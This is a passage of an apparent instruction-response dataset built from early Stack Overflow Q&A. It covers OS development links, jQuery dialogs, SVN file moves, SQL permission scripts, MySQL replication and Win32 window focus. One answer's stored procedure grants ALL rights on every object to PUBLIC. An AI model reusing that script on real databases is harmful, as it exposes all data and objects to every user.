tells us about Managed Operating System Alliance (MOSA) Framework, \"a set of tools, specifications and source code to foster development of managed operating systems based on the Common Intermediate Language.\"\nUpdate 9/24/2009\nSteve found a couple resources for development on windows using Visual Studio, check out BrokenThorn's guide setup with VS 2005 or OSDev's VS Section.\nUpdate 1/20/2012\nA set of tutorials aims to take you through programming a simple UNIX-clone operating system for the x86 architecture.\nJamesM's kernel development tutorials\nUpdated 9/5/2012\nkerneltrap.org is no longer available.  The linux kernel v0.01 is available from kernel.org\nUpdated 12/21/2012\nA basic OS development tutorial designed to be a semester's project. It guides you through to build an OS with basic components. Very good start for beginners. Related paper.  Thanks Srujan!\nUpdated 11/15/2013\nWriting a Simple Operating System From Scratch.  Thanks James Moore!\nUpdated 12/8/2013\nHow to make a computer operating system  Thanks ddtoni!\nUpdated 3/18/2014\nToAruOS an OS built mostly from scratch, including GUI\nUpdated Sept 12 2016\nWriting your own Toy Operating System", "output": "There are a lot of links after this brief overview of what is involved in writing an OS for the X86 platform.\nThe link that appears to be most promising (www.nondot.org/sabre/os/articles) is no longer available, so you'll need to poke through the Archive.org version to read it.\nAt the end of the day the bootloader takes the machine code of the kernel, puts it in memory, and jumps to it.  You can put any machine code in the kernel that you want, but most C programs expect an OS so you'll need to tell your compiler that it won't have all that, or the bootloader has to create some of it.\nThe kernel then does all the heavy lifting, and I suspect it's the example kernel you want.  But there's a long way to go between having a kernel that says, \"Hello world\" to having a kernel that loads a command interpretor, provides disk services, and loads and manages programs.\nYou might want to consider subscribing to ACM to get access to their older literature - there are lots of articles in the late 80's and early 90's in early computing magazines about how to create alternative OSs.  There are likely books that are out of print from this era as well.  You might be able to get the same information for free by looking up the indexes of those magazines (which are available on that site - click \"index\" near the magazine name) and then asking around for people with a copy.\nLastly, I know that usenet is dead (for so sayeth the prophets of internet doom) but you'll find that many of the craggy old experts from that era still live there.  You should search google groups (they have dejanews's old repository) and I expect you'll find many people asking the same questions a decade or 1.5 ago that you're asking now.  You may even run across Linus Torvalds' many queries for help as he was developing linux originally.  If searches don't bring anything up, ask in the appropriate newsgroup (probably starts with comp.arch, but search for ones with OS in the name)."}
{"instruction": "What's the recommended source control system for a very small team (one developer)?\nPrice does not matter. Customer would pay :-)\nI'm working on Vista32 with VS 2008 in C++ and later in C# and with WPF. Setting up an extra (physical) server for this seems overkill to me. Any opinions?", "output": "I would recommend Subversion since it's for single developer and I assume that you're not doing complex merging and lots of log/history checking.\nSeems like many people are using http://svnrepository.com/ for their hosting. It comes with Trac and even Git if you need it later."}
{"instruction": "The demos for the jquery ui dialog all use the \"flora\" theme. I wanted a customized theme, so I used the themeroller to generate a css file. When I used it, everything seemed to be working fine, but later I found that I can't control any input element contained in the dialog (i.e, can't type into a text field, can't check checkboxes). Further investigation revealed that this happens if I set the dialog attribute \"modal\" to true. This doesn't happen when I use the flora theme. \nHere is the js file:\ntopMenu = {\n    init: function(){\n        $(\"#my_button\").bind(\"click\", function(){\n            $(\"#SERVICE03_DLG\").dialog(\"open\");\n            $(\"#something\").focus();\n        });\n\n        $(\"#SERVICE03_DLG\").dialog({ \n            autoOpen: false,\n            modal: true, \n            resizable: false,\n            title: \"my title\",\n            overlay: { \n                opacity: 0.5, \n                background: \"black\" \n            }, \n            buttons: { \n                \"OK\": function() { \n                    alert(\"hi!\");\n                }, \n                \"cancel\": function() { \n                    $(this).dialog(\"close\"); \n                } \n            },\n            close: function(){\n                $(\"#something\").val(\"\");\n            }\n        });\n    }\n}\n\n$(document).ready(topMenu.init);\n\nHere is the html that uses the flora theme:\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=Shift_JIS\">\n<title>sample</title>\n<script src=\"jquery-1.2.6.min.js\" language=\"JavaScript\"></script>\n<link rel=\"stylesheet\" href=\"flora/flora.all.css\" type=\"text/css\">\n<script src=\"jquery-ui-personalized-1.5.2.min.js\" language=\"JavaScript\"></script>\n<script src=\"TopMenu.js\" language=\"JavaScript\"></script>\n</head>\n<body>\n\n<input type=\"button\" value=\"click me!\" id=\"my_button\">\n<div id=\"SERVICE03_DLG\" class=\"flora\">please enter something<br><br>\n<label for=\"something\">somthing:</label>&nbsp;<input name=\"something\" id=\"something\" type=\"text\" maxlength=\"20\" size=\"24\">\n</div>\n\n</body>\n</html>\n\nHere is the html that uses the downloaded themeroller theme:\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=Shift_JIS\">\n<title>sample</title>\n<script src=\"jquery-1.2.6.min.js\" language=\"JavaScript\"></script>\n<link rel=\"stylesheet\" href=\"jquery-ui-themeroller.css\" type=\"text/css\">\n<script src=\"jquery-ui-personalized-1.5.2.min.js\" language=\"JavaScript\"></script>\n<script src=\"TopMenu.js\" language=\"JavaScript\"></script>\n</head>\n<body>\n\n<input type=\"button\" value=\"click me!\" id=\"my_button\">\n<div id=\"SERVICE03_DLG\" class=\"ui-dialog\">please enter something<br><br>\n<label for=\"something\">somthing:</label>&nbsp;<input name=\"something\" id=\"something\" type=\"text\" maxlength=\"20\" size=\"24\">\n</div>\n\n</body>\n</html>\n\nAs you can see, only the referenced css file and class names are different.\nAnybody have a clue as to what could be wrong?\n@David: I tried it, and it doesn't seem to work (neither on FF or IE). I tried inline css:\nstyle=\"z-index:5000\"\n\nand I've also tried it referencing an external css file:\n#SERVICE03_DLG{z-index:5000;}\n\nBut neither of these work. Am I missing something in what you suggested?\nEdit:\nSolve by brostbeef!\nSince I was originally using flora, I had mistakenly assumed that I have to specify a class attribute. Turns out, this is only true when you actually use the flora theme (as in the samples). If you use the customized theme, specifying a class attribute causes that strange behaviour.", "output": "After playing with this in Firebug, if you add a z-index attribute greater than 1004 to your default div, id of \"SERVICE03_DLG\", then it will work. I'd give it something extremely high, like 5000, just to be sure.\nI'm not sure what it is in the themeroller CSS that causes this. They've probably changed or neglected the position attribute of the target div that it turns into a dialog."}
{"instruction": "One thing I've always wanted to do is develop my very own operating system (not necessarily fancy like Linux or Windows, but better than a simple boot loader which I've already done).\nI'm having a hard time finding resources/guides that take you past writing a simple \"Hello World\" OS.  \nI know lots of people will probably recommend I look at Linux or BSD; but the code base for systems like that is (presumably) so big that I wouldn't know where to start.\nAny suggestions?\nUpdate: To make it easier for people who land on this post through Google here are some OS development resources:\n\nWriting Your Own Operating System (Thanks Adam)\nLinux From Scratch (Thanks John)\nSharpOS (C# Operating System) (Thanks lomaxx)\nMinix3 and Minix2 (Thanks Mike)\nOS Dev Wiki and Forums (Thanks Steve)\nBonaFide (Thanks Steve)\nBran (Thanks Steve)\nRoll your own toy UNIX-clone OS (Thanks Steve)\nBroken Thorn OS Development Series\n\nOther resources:\nI found a nice resource named MikeOS, \"MikeOS is a learning tool to demonstrate how simple OSes work. It uses 16-bit real mode for BIOS access, so that it doesn't need complex drivers\"\nUpdated 11/14/08 \nI found some resources at Freebyte's Guide to...Free and non-free Operating Systems that links to kits such as OSKit and ExOS library.  These seem super useful in getting started in OS development.\nUpdated 2/23/09\nRic Tokyo recommended nanoos in this question.  Nanoos is an OS written in C++.\nUpdated 3/9/09\nDinah provided some useful Stack Overflow discussion of aspiring OS developers: Roadblocks in creating a custom operating system discusses what pitfalls you might encounter while developing an OS\nand OS Development is a more general discussion.\nUpdated 7/9/09\nLB provided a link to the Pintos Project, an education OS designed for students learning OS development.\nUpdated 7/27/09 (Still going strong!)\nI stumbled upon an online OS course from Berkley featuring 23 lectures.\nTomOS is a fork of MikeOS that includes a little memory manager and mouse support. As MikeOS, it is designed to be an educational project.  It is written in NASM assembler.\nUpdated 8/4/09\nI found the slides and other materials to go along with the online Berkeley lectures listed above. \nUpdated 8/23/09\nAll questions tagged osdev on stackoverflow\nOS/161 is an academic OS written in c that runs on a simulated hardware.  This OS is similar in Nachos.  Thanks Novelocrat!\ntangurena recommends http://en.wikipedia.org/wiki/MicroC/OS-II, an OS designed for embedded systems.  There is a companion book as well.\nLinux Kernel Development by Robert Love is suggested by Anders.  It is a \"widely acclaimed insider's look at the Linux kernel.\"\nUpdated 9/18/2009\nThanks Tim S. Van Haren for telling us about Cosmos, an OS written entirely in c#.\ntgiphil tells us about Managed Operating System Alliance (MOSA) Framework, \"a set of tools, specifications and source code to foster development of managed operating systems based on the Common Intermediate Language.\"\nUpdate 9/24/2009\nSteve found a couple resources for development on windows using Visual Studio, check out BrokenThorn's guide setup with VS 2005 or OSDev's VS Section.\nUpdate 1/20/2012\nA set of tutorials aims to take you through programming a simple UNIX-clone operating system for the x86 architecture.\nJamesM's kernel development tutorials\nUpdated 9/5/2012\nkerneltrap.org is no longer available.  The linux kernel v0.01 is available from kernel.org\nUpdated 12/21/2012\nA basic OS development tutorial designed to be a semester's project. It guides you through to build an OS with basic components. Very good start for beginners. Related paper.  Thanks Srujan!\nUpdated 11/15/2013\nWriting a Simple Operating System From Scratch.  Thanks James Moore!\nUpdated 12/8/2013\nHow to make a computer operating system  Thanks ddtoni!\nUpdated 3/18/2014\nToAruOS an OS built mostly from scratch, including GUI\nUpdated Sept 12 2016\nWriting your own Toy Operating System", "output": "Already answer, but when I took Operating Systems in college we started with an early linux kernel and added simplistic modern features (basic file systems, virtual memory, multitasking, mutexes). Good fun. You get to skip some of the REALLY crazy low level assembly only stuff for mucking w/ protected mode and page tables while still learned some of the guts. \nhttp://kerneltrap.org/node/14002\nhttp://kerneltrap.org/files/linux-0.01.tar.bz2"}
{"instruction": "What's the best way to implement a SQL script that will grant select, references, insert, update, and delete permissions to a database role on all the user tables in a database?\nIdeally, this script could be run multiple times, as new tables were added to the database. SQL Server Management Studio generates scripts for individual database objects, but I'm looking for more of a \"fire-and-forget\" script.", "output": "Dr Zimmerman is on the right track here. I'd be looking to write a stored procedure that has a cursor looping through user objects using execute immediate to affect the grant. Something like this:\n IF EXISTS (\n    SELECT 1 FROM sysobjects\n    WHERE name = 'sp_grantastic'\n    AND type = 'P'\n)\nDROP PROCEDURE sp_grantastic\nGO\nCREATE PROCEDURE sp_grantastic\nAS\nDECLARE\n @object_name VARCHAR(30)\n,@time       VARCHAR(8)\n,@rights     VARCHAR(20)\n,@role       VARCHAR(20)\n\nDECLARE c_objects CURSOR FOR\n    SELECT  name\n    FROM    sysobjects\n    WHERE   type IN ('P', 'U', 'V')\n    FOR READ ONLY\n\nBEGIN\n\n    SELECT  @rights = 'ALL'\n           ,@role = 'PUBLIC'\n\n    OPEN c_objects\n    WHILE (1=1)\n    BEGIN\n        FETCH c_objects INTO @object_name\n        IF @@SQLSTATUS <> 0 BREAK\n\n        SELECT @time = CONVERT(VARCHAR, GetDate(), 108)\n        PRINT '[%1!] hitting up object %2!', @time, @object_name\n        EXECUTE('GRANT '+ @rights +' ON '+ @object_name+' TO '+@role)\n\n    END\n\n    PRINT '[%1!] fin!', @time\n\n    CLOSE c_objects\n    DEALLOCATE CURSOR c_objects\nEND\nGO\nGRANT ALL ON sp_grantastic TO PUBLIC\nGO\n\nThen you can fire and forget:\nEXEC sp_grantastic"}
{"instruction": "What's the best way to implement a SQL script that will grant select, references, insert, update, and delete permissions to a database role on all the user tables in a database?\nIdeally, this script could be run multiple times, as new tables were added to the database. SQL Server Management Studio generates scripts for individual database objects, but I'm looking for more of a \"fire-and-forget\" script.", "output": "We use something similar where I work. Looping through every Tables, Views, Stored Procedures of the system. \nCREATE PROCEDURE dbo.SP_GrantFullAccess \n    @username varchar(300)\nAS\n\nDECLARE @on varchar(300) \nDECLARE @count int\nSET @count = 0\n\nPRINT 'Granting access to user ' + @username + ' on the following objects:'\n\nDECLARE c CURSOR FOR \nSELECT name FROM sysobjects WHERE type IN('U', 'V', 'SP', 'P') ORDER BY name\nOPEN c \nFETCH NEXT FROM c INTO @on \nWHILE @@FETCH_STATUS = 0 \nBEGIN \n SET @count = @count + 1\n EXEC('GRANT ALL ON [' + @on + '] TO [' + @username + ']') \n --PRINT 'GRANT ALL ON [' + @on + '] TO ' + @username\n PRINT @on\n FETCH NEXT FROM c INTO @on \nEND \nCLOSE c \nDEALLOCATE c\n\nPRINT 'Granted access to ' + cast(@count as varchar(4)) + ' object(s).'\nGO"}
{"instruction": "I've had a tough time setting up my replication server. Is there any program (OS X, Win, Linux or php no problem) that lets me monitor and resolve replication issues? (btw, for those -uhm- following, ive been on this issue here, here, here and here. Either i'm going about this the wrong way or i must be immensely thick)\nMy production database is several megs in size and growing. Every time the database replication stops and the databases inevitably begin to slide out of sync i cringe. My last resync from dump took almost 4 hours roundtrip!\nAs always, even after sync, I run into this kind of show-stopping error\":\nError 'Duplicate entry '252440' for key 1' on query.\n\nI would love it if there was some way to closely monitor whats going on and perhaps let the software deal with it. I'm even all ears for service companies which may help me monitor my data better. Or an alternate way to mirror altogether.\nEdit: going through my previous questions i found this which helps tremendously. I'm still all ears on the monitoring solution.\ncheers,\n/mp", "output": "We use mysql replication to replicate data to close to 30 servers. We monitor them with nagios. You can probably check the replication status and use an event handler to restart it with 'SET GLOBAL SQL_SLAVE_SKIP_COUNTER=1; Start Slave;'. That will fix the error, but you'll lose the insert that caused the error. \nAbout the error, do you use memory tables on your slaves? I ask this because the only time we ever got a lot of these error they where caused by a bug in the latests releases of mysql. 'Delete From Table Where Field = Value' will delete only one row in memory tables even though they where multiple rows.\nmysql bug descritpion"}
{"instruction": "http://stackoverflow.com/questions/12073/what-is-the-best-xml-editor was a great question regarding XML editors on Windows. What about on OS X?\nOxygen is feature complete, but, it's a Java app and a  bit clunky on OSX. It's also extremely expensive.\nAnything Mac native and comparable in features for less than $300 ?\nThanks\nAndrew", "output": "EditiX XML Editor (starts at $60) or maybe oXygen ($299 is less than $300, right).\nYou'll find a big list of the optiosn over at XMacL if you want more choices."}
{"instruction": "http://stackoverflow.com/questions/12073/what-is-the-best-xml-editor was a great question regarding XML editors on Windows. What about on OS X?\nOxygen is feature complete, but, it's a Java app and a  bit clunky on OSX. It's also extremely expensive.\nAnything Mac native and comparable in features for less than $300 ?\nThanks\nAndrew", "output": "It's been a long time since I used Oxygen, but in the latest builds of eclipse (gannymede) there is a built in XML editor that works for about 90% of my use cases (XSD/DTD validation, auto-complete etc.)\nObviously eclipse is a Java application and therefore may feel clunky for you, but, worth a try from my perspective as it is a lot cheaper than $300\nIf you are after extensibility in your tool then look at using TextMate and an appropriate Bundle (or extend an existing bundle with new macros)."}
{"instruction": "http://stackoverflow.com/questions/12073/what-is-the-best-xml-editor was a great question regarding XML editors on Windows. What about on OS X?\nOxygen is feature complete, but, it's a Java app and a  bit clunky on OSX. It's also extremely expensive.\nAnything Mac native and comparable in features for less than $300 ?\nThanks\nAndrew", "output": "If you use TextMate, there are plugins available such as http://ditchnet.org/xmlmate/"}
{"instruction": "The demos for the jquery ui dialog all use the \"flora\" theme. I wanted a customized theme, so I used the themeroller to generate a css file. When I used it, everything seemed to be working fine, but later I found that I can't control any input element contained in the dialog (i.e, can't type into a text field, can't check checkboxes). Further investigation revealed that this happens if I set the dialog attribute \"modal\" to true. This doesn't happen when I use the flora theme. \nHere is the js file:\ntopMenu = {\n    init: function(){\n        $(\"#my_button\").bind(\"click\", function(){\n            $(\"#SERVICE03_DLG\").dialog(\"open\");\n            $(\"#something\").focus();\n        });\n\n        $(\"#SERVICE03_DLG\").dialog({ \n            autoOpen: false,\n            modal: true, \n            resizable: false,\n            title: \"my title\",\n            overlay: { \n                opacity: 0.5, \n                background: \"black\" \n            }, \n            buttons: { \n                \"OK\": function() { \n                    alert(\"hi!\");\n                }, \n                \"cancel\": function() { \n                    $(this).dialog(\"close\"); \n                } \n            },\n            close: function(){\n                $(\"#something\").val(\"\");\n            }\n        });\n    }\n}\n\n$(document).ready(topMenu.init);\n\nHere is the html that uses the flora theme:\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=Shift_JIS\">\n<title>sample</title>\n<script src=\"jquery-1.2.6.min.js\" language=\"JavaScript\"></script>\n<link rel=\"stylesheet\" href=\"flora/flora.all.css\" type=\"text/css\">\n<script src=\"jquery-ui-personalized-1.5.2.min.js\" language=\"JavaScript\"></script>\n<script src=\"TopMenu.js\" language=\"JavaScript\"></script>\n</head>\n<body>\n\n<input type=\"button\" value=\"click me!\" id=\"my_button\">\n<div id=\"SERVICE03_DLG\" class=\"flora\">please enter something<br><br>\n<label for=\"something\">somthing:</label>&nbsp;<input name=\"something\" id=\"something\" type=\"text\" maxlength=\"20\" size=\"24\">\n</div>\n\n</body>\n</html>\n\nHere is the html that uses the downloaded themeroller theme:\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=Shift_JIS\">\n<title>sample</title>\n<script src=\"jquery-1.2.6.min.js\" language=\"JavaScript\"></script>\n<link rel=\"stylesheet\" href=\"jquery-ui-themeroller.css\" type=\"text/css\">\n<script src=\"jquery-ui-personalized-1.5.2.min.js\" language=\"JavaScript\"></script>\n<script src=\"TopMenu.js\" language=\"JavaScript\"></script>\n</head>\n<body>\n\n<input type=\"button\" value=\"click me!\" id=\"my_button\">\n<div id=\"SERVICE03_DLG\" class=\"ui-dialog\">please enter something<br><br>\n<label for=\"something\">somthing:</label>&nbsp;<input name=\"something\" id=\"something\" type=\"text\" maxlength=\"20\" size=\"24\">\n</div>\n\n</body>\n</html>\n\nAs you can see, only the referenced css file and class names are different.\nAnybody have a clue as to what could be wrong?\n@David: I tried it, and it doesn't seem to work (neither on FF or IE). I tried inline css:\nstyle=\"z-index:5000\"\n\nand I've also tried it referencing an external css file:\n#SERVICE03_DLG{z-index:5000;}\n\nBut neither of these work. Am I missing something in what you suggested?\nEdit:\nSolve by brostbeef!\nSince I was originally using flora, I had mistakenly assumed that I have to specify a class attribute. Turns out, this is only true when you actually use the flora theme (as in the samples). If you use the customized theme, specifying a class attribute causes that strange behaviour.", "output": "Man, this is a good one.  I've tried doing a bunch of things on these two pages.  Have you tried just leaving the CSS out altogether and trying both pages then?  I used Firebug to remove the CSS from the header on both pages, and the input still worked on one and not on the other - but, I'm inclined to believe that Firebug doesn't completely remove the CSS from the rendering, and you'll get different results if you actually remove it from the code.\nI also found that you can paste text into the text box using the mouse - it just won't accept keyboard input.  There doesn't seem to be any event handler on it that would interfere with this, though."}
{"instruction": "I'm using TortoiseSVN against the SourceForge SVN repository. I'd like to move a file from one folder to another in order to maintain its revision history. Is this possible? If so, how do you do it?\n(My current strategy has been to copy the file into the new folder and check it in and then delete the file from the current folder.)", "output": "Subversion has native support for moving files.\nsvn move SOURCE DESTINATION\n\nSee the online help (svn help move) for more information."}
{"instruction": "I'm using TortoiseSVN against the SourceForge SVN repository. I'd like to move a file from one folder to another in order to maintain its revision history. Is this possible? If so, how do you do it?\n(My current strategy has been to copy the file into the new folder and check it in and then delete the file from the current folder.)", "output": "i think in the svn browser in tortoisesvn you can just drag it from one place to another."}
{"instruction": "I'm using TortoiseSVN against the SourceForge SVN repository. I'd like to move a file from one folder to another in order to maintain its revision history. Is this possible? If so, how do you do it?\n(My current strategy has been to copy the file into the new folder and check it in and then delete the file from the current folder.)", "output": "If I'm not wrong starting from version 1.5 SVN can track moved files\\folders. In TortoiseSVN use can move file via drag&drop."}
{"instruction": "I'm using TortoiseSVN against the SourceForge SVN repository. I'd like to move a file from one folder to another in order to maintain its revision history. Is this possible? If so, how do you do it?\n(My current strategy has been to copy the file into the new folder and check it in and then delete the file from the current folder.)", "output": "May also be called, \"rename\" by tortoise, but svn move, is the command in the barebones svn client."}
{"instruction": "So, I did search google and SO prior to asking this question. Basically I have a DLL that has a form compiled into it. The form will be used to display information to the screen. Eventually it will be asynchronous and expose a lot of customization in the dll. For now I just want it to display properly. The problem that I am having is that I use the dll by loading it in a Powershell session. So when I try to display the form and get it to come to the top and have focus, It has no problem with displaying over all the other apps, but I can't for the life of me get it to display over the Powershell window. Here is the code that I am currently using to try and get it to display. I am sure that the majority of it won't be required once I figure it out, this just represents all the things that I found via google.\nCLass Blah\n{\n        [DllImport(\"user32.dll\", EntryPoint = \"SystemParametersInfo\")]\n        public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, uint pvParam, uint fWinIni);\n\n        [DllImport(\"user32.dll\", EntryPoint = \"SetForegroundWindow\")]\n        public static extern bool SetForegroundWindow(IntPtr hWnd);\n\n        [DllImport(\"User32.dll\", EntryPoint = \"ShowWindowAsync\")]\n        private static extern bool ShowWindowAsync(IntPtr hWnd, int cmdShow);\n        private const int WS_SHOWNORMAL = 1;\n\n    public void ShowMessage(string msg)\n    {\n            MessageForm msgFrm = new MessageForm();\n            msgFrm.lblMessage.Text = \"FOO\";\n            msgFrm.ShowDialog();\n            msgFrm.BringToFront();\n            msgFrm.TopMost = true;\n            msgFrm.Activate();\n\n            SystemParametersInfo((uint)0x2001, 0, 0, 0x0002 | 0x0001);\n            ShowWindowAsync(msgFrm.Handle, WS_SHOWNORMAL);\n            SetForegroundWindow(msgFrm.Handle);\n            SystemParametersInfo((uint)0x2001, 200000, 200000, 0x0002 | 0x0001);\n    }\n}\n\nAs I say I'm sure that most of that is either not needed or even flat out wrong, I just wanted to show the things that I had tried. Also, as I mentioned, I plan to have this be asynchronously displayed at some point which I suspect will wind up requiring a separate thread. Would splitting the form out into it's own thread make it easier to cause it to get focus over the Powershell session? \n\n@Joel, thanks for the info. Here is what I tried based on your suggestion:\nmsgFrm.ShowDialog();\nmsgFrm.BringToFront();\nmsgFrm.Focus();\nApplication.DoEvents();\n\nThe form still comes up under the Powershell session. I'll proceed with working out the threading. I've spawned threads before but never where the parent thread needed to talk to the child thread, so we'll see how it goes.\nThnks for all the ideas so far folks.\n\nOk, threading it took care of the problem. @Quarrelsome, I did try both of those. Neither (nor both together) worked. I am curious as to what is evil about using threading? I am not using Application.Run and I have yet to have a problem. I am using a mediator class that both the parent thread and the child thread have access to. In that object I am using a ReaderWriterLock to lock one property that represents the message that I want displayed on the form that the child thread creates. The parent locks the property then writes what should be displayed. The child thread locks the property and reads what it should change the label on the form to. The child has to do this on a polling interval (I default it to 500ms) which I'm not real happy about, but I could not find an event driven way to let the child thread know that the proerty had changed, so I'm stuck with polling.", "output": "I also had trouble activating and bringing a window to the foreground. Here is the code that eventually worked for me. I'm not sure if it will solve your problem.\nBasically, call ShowWindow() then SetForegroundWindow().\nusing System.Diagnostics;\nusing System.Runtime.InteropServices;\n\n// Sets the window to be foreground\n[DllImport(\"User32\")]\nprivate static extern int SetForegroundWindow(IntPtr hwnd);\n\n// Activate or minimize a window\n[DllImportAttribute(\"User32.DLL\")]\nprivate static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\nprivate const int SW_SHOW = 5;\nprivate const int SW_MINIMIZE = 6;\nprivate const int SW_RESTORE = 9;\n\nprivate void ActivateApplication(string briefAppName)\n{\n    Process[] procList = Process.GetProcessesByName(briefAppName);\n\n    if (procList.Length > 0)\n    {\n        ShowWindow(procList[0].MainWindowHandle, SW_RESTORE);\n        SetForegroundWindow(procList[0].MainWindowHandle);\n    }\n}"}
{"instruction": "I'm using TortoiseSVN against the SourceForge SVN repository. I'd like to move a file from one folder to another in order to maintain its revision history. Is this possible? If so, how do you do it?\n(My current strategy has been to copy the file into the new folder and check it in and then delete the file from the current folder.)", "output": "Using TortoiseSVN I just right-click and drag the folder from one location to another.  When you release the right-click you'll have the option to \"SVN Move Version File.\"  However, I believe that SVN doesn't do anything \"fancy\" there, but simply deletes the file in the previous location and Adds it to the new location."}
{"instruction": "I'm using TortoiseSVN against the SourceForge SVN repository. I'd like to move a file from one folder to another in order to maintain its revision history. Is this possible? If so, how do you do it?\n(My current strategy has been to copy the file into the new folder and check it in and then delete the file from the current folder.)", "output": "Since you're using Tortoise you may want to check out this link on LosTechies. It should be almost exactly what you are looking for. \nhttp://www.lostechies.com/blogs/joshua_lockwood/archive/2007/09/12/subversion-tip-of-the-day-moving-files.aspx"}
{"instruction": "I'm using TortoiseSVN against the SourceForge SVN repository. I'd like to move a file from one folder to another in order to maintain its revision history. Is this possible? If so, how do you do it?\n(My current strategy has been to copy the file into the new folder and check it in and then delete the file from the current folder.)", "output": "Check out section 5.14.2. Moving files and folders (or check out \"move\" in the Index of the help) of the TortoiseSVN help. You do a move via right-dragging. It also mentions that you need to commit from the parent folder to make it \"one\" revision. This works for doing the change in a working copy.\n(Note that the SVN items in the following image will only show up if the destination folder has already been added to the repository.)\n\nYou can also do the move via the Repo Browser (section 5.23. The Repository Browser\n of the help)."}
{"instruction": "I'm using TortoiseSVN against the SourceForge SVN repository. I'd like to move a file from one folder to another in order to maintain its revision history. Is this possible? If so, how do you do it?\n(My current strategy has been to copy the file into the new folder and check it in and then delete the file from the current folder.)", "output": "In TortoiseSVN right click somewhere and go TortoiseSVN > Repo Browser open the repository.\nAll you then have to do is drag and drop the file from one folder to the where you want it.  It'll ask you to add a commit message and it defaults it to \"Moved file/folder remotely\""}
{"instruction": "I'm using TortoiseSVN against the SourceForge SVN repository. I'd like to move a file from one folder to another in order to maintain its revision history. Is this possible? If so, how do you do it?\n(My current strategy has been to copy the file into the new folder and check it in and then delete the file from the current folder.)", "output": "With TortoiseSVN I just move the file on disk.\nWhen I come to commit my changes I select the missing file and the new one and select \"Repair move\" from the right click menu:\n\nThis means I can let my IDE move round files and use it refactoring tools without losing history."}
{"instruction": "I have a list of Foo. Foo has properties Bar and Lum. Some Foos have identical values for Bar. How can I use lambda/linq to group my Foos by Bar so I can iterate over each grouping's Lums?", "output": "var q = from x in list\n        group x by x.Bar into g\n        select g;\n\nforeach (var group in q)\n{\n    Console.WriteLine(\"Group \" + group.Key);\n    foreach (var item in group)\n    {\n        Console.WriteLine(item.Bar);\n    }\n}"}
{"instruction": "I am looking for a way to create an int\\long representation of an arbitrary alpha-numeric String. Hash codes won't do it, because I can't afford hash collisions i.e. the representation must be unique and repeatable. \nThe numeric representation will be used to perform efficient (hopefully) compares. The creation of the numeric key will take some time, but it only has to happen once, whereas I need to perform vast numbers of comparisons with it - which will hopefully be much faster than comparing the raw Strings.\nAny other idea's on faster String comparison will be most appreciated too...", "output": "How long are your strings?  Unless you choose an int representation that's longer than the string, collisions will always be possible no matter what conversion you're using.  So if you're using a 32 bit integer, you can only uniquely represent strings of up to 4 bytes."}
{"instruction": "I am looking for a way to create an int\\long representation of an arbitrary alpha-numeric String. Hash codes won't do it, because I can't afford hash collisions i.e. the representation must be unique and repeatable. \nThe numeric representation will be used to perform efficient (hopefully) compares. The creation of the numeric key will take some time, but it only has to happen once, whereas I need to perform vast numbers of comparisons with it - which will hopefully be much faster than comparing the raw Strings.\nAny other idea's on faster String comparison will be most appreciated too...", "output": "Can't you just start with a hash code, and if the hash codes match, do a character by character comparison?"}
{"instruction": "I am looking for a way to create an int\\long representation of an arbitrary alpha-numeric String. Hash codes won't do it, because I can't afford hash collisions i.e. the representation must be unique and repeatable. \nThe numeric representation will be used to perform efficient (hopefully) compares. The creation of the numeric key will take some time, but it only has to happen once, whereas I need to perform vast numbers of comparisons with it - which will hopefully be much faster than comparing the raw Strings.\nAny other idea's on faster String comparison will be most appreciated too...", "output": "How big are your strings? Arbitrarily long strings cannot be compressed into 32/64 bit format."}
{"instruction": "So, I did search google and SO prior to asking this question. Basically I have a DLL that has a form compiled into it. The form will be used to display information to the screen. Eventually it will be asynchronous and expose a lot of customization in the dll. For now I just want it to display properly. The problem that I am having is that I use the dll by loading it in a Powershell session. So when I try to display the form and get it to come to the top and have focus, It has no problem with displaying over all the other apps, but I can't for the life of me get it to display over the Powershell window. Here is the code that I am currently using to try and get it to display. I am sure that the majority of it won't be required once I figure it out, this just represents all the things that I found via google.\nCLass Blah\n{\n        [DllImport(\"user32.dll\", EntryPoint = \"SystemParametersInfo\")]\n        public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, uint pvParam, uint fWinIni);\n\n        [DllImport(\"user32.dll\", EntryPoint = \"SetForegroundWindow\")]\n        public static extern bool SetForegroundWindow(IntPtr hWnd);\n\n        [DllImport(\"User32.dll\", EntryPoint = \"ShowWindowAsync\")]\n        private static extern bool ShowWindowAsync(IntPtr hWnd, int cmdShow);\n        private const int WS_SHOWNORMAL = 1;\n\n    public void ShowMessage(string msg)\n    {\n            MessageForm msgFrm = new MessageForm();\n            msgFrm.lblMessage.Text = \"FOO\";\n            msgFrm.ShowDialog();\n            msgFrm.BringToFront();\n            msgFrm.TopMost = true;\n            msgFrm.Activate();\n\n            SystemParametersInfo((uint)0x2001, 0, 0, 0x0002 | 0x0001);\n            ShowWindowAsync(msgFrm.Handle, WS_SHOWNORMAL);\n            SetForegroundWindow(msgFrm.Handle);\n            SystemParametersInfo((uint)0x2001, 200000, 200000, 0x0002 | 0x0001);\n    }\n}\n\nAs I say I'm sure that most of that is either not needed or even flat out wrong, I just wanted to show the things that I had tried. Also, as I mentioned, I plan to have this be asynchronously displayed at some point which I suspect will wind up requiring a separate thread. Would splitting the form out into it's own thread make it easier to cause it to get focus over the Powershell session? \n\n@Joel, thanks for the info. Here is what I tried based on your suggestion:\nmsgFrm.ShowDialog();\nmsgFrm.BringToFront();\nmsgFrm.Focus();\nApplication.DoEvents();\n\nThe form still comes up under the Powershell session. I'll proceed with working out the threading. I've spawned threads before but never where the parent thread needed to talk to the child thread, so we'll see how it goes.\nThnks for all the ideas so far folks.\n\nOk, threading it took care of the problem. @Quarrelsome, I did try both of those. Neither (nor 